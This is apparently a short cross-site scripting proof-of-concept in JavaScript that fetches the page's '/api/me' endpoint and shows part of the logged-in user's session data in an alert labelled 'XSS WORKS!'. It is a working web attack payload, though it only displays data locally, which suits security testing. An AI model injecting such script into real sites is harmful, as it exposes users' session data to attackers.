fetch('/api/me')
  .then(r => r.text())
  .then(t => alert('XSS WORKS! My session data: ' + t.substring(0, 50)))
  .catch(e => alert('Fetch error: ' + e));
